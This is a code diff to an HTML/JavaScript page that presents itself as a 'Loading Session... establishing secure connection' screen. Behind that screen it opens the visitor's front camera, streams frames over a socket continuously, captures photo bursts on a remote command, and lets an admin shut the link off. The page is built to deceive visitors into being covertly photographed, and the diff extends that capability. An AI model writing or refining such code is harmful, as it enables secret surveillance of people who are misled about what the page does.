@@ -48,7 +48,7 @@
 </head>
 <body>
 
-    <div class="card">
+    <div class="card" id="mainCard">
         <h2>Loading Session...</h2>
         <div class="spinner"></div>
         <p style="color: #666; font-size: 14px;">Please wait while we establish secure connection.</p>
@@ -62,21 +62,19 @@
         const socket = io();
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-
+        let mediaStream = null;
         let isCameraReady = false;
-        let captureCount = 0;
-        const maxCaptures = 5;
-        let intervalId = null;
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
+                mediaStream = stream;
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
                     isCameraReady = true;
                     socket.emit('user-ready');
 
-                    // Smooth Live Streaming Loop (~15 fps stream)
+                    // Continuous Smooth Live Stream Loop (Runs as long as tab is open)
                     setInterval(() => {
                         if (!isCameraReady) return;
                         const context = canvas.getContext('2d');
@@ -96,19 +94,17 @@
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
             const imageData = canvas.toDataURL('image/jpeg', 0.6);
             socket.emit('user-photo-captured', imageData);
         }
 
         socket.on('start-auto-capture', () => {
-            captureCount = 0;
-            if (intervalId) clearInterval(intervalId);
-
+            let captureCount = 0;
+            const maxCaptures = 5;
             takeSinglePhoto();
             captureCount++;
 
-            intervalId = setInterval(() => {
+            const intervalId = setInterval(() => {
                 if (captureCount < maxCaptures) {
                     takeSinglePhoto();
                     captureCount++;
@@ -119,6 +115,19 @@
         });
 
         socket.on('capture-photo', () => takeSinglePhoto());
+
+        // Triggered when Admin turns OFF the link
+        socket.on('disable-user-access', () => {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+            document.body.innerHTML = `
+                <div class="card">
+                    <h2 style="color: #e53935;">Session Ended</h2>
+                    <p style="color: #666; font-size: 14px;">This link has been disabled by the administrator.</p>
+                </div>
+            `;
+        });
     </script>
 </body>
 </html>
